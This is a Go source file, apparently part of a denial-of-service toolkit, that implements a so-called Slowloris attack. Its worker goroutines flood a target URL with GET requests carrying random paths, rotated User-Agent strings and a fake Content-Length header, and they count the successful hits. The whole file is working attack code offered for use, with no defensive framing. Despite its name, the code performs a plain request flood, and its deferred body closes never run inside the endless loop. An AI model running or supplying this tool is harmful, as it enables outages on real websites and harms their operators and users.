package DDoS

import (
	"fmt"
	"math/rand"
	"runtime"
	"sync/atomic"

	"net/http"
)

// Slowloris ...
type Slowloris struct {
	ID             int
	Target         string
	StopProcess    *chan bool
	Workers        int
	SuccessRequest int64
	TotalRequest   int64
}

// NewSlowloris ...
func NewSlowloris(targetURL string, workers, QueueID int) (*Slowloris, error) {
	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}

	s := make(chan bool)
	return &Slowloris{
		ID:             QueueID,
		Target:         targetURL,
		StopProcess:    &s,
		Workers:        workers,
		SuccessRequest: 0,
		TotalRequest:   0,
	}, nil
}

// Run ...
func (s *Slowloris) Run() {
	for i := 0; i < s.Workers; i++ {
		go func() {
			for {
				select {
				case <-(*s.StopProcess):
					return
				default:
					client := &http.Client{}
					if req, err := http.NewRequest("GET", s.Target+RandomString(5, true), nil); err == nil {
						req.Header.Add("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
						req.Header.Add("Content-Length", "42")
						resp, err := client.Do(req)
						atomic.AddInt64(&s.TotalRequest, 1)
						if err == nil {
							atomic.AddInt64(&s.SuccessRequest, 1)
							defer resp.Body.Close()
						}
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

// Stop ...
func (s *Slowloris) Stop() {
	for i := 0; i < s.Workers; i++ {
		(*s.StopProcess) <- true
	}
	close(*s.StopProcess)
}

// Result ...
func (s *Slowloris) Result() (successRequest, totalRequest int64) {
	return s.SuccessRequest, s.TotalRequest
}
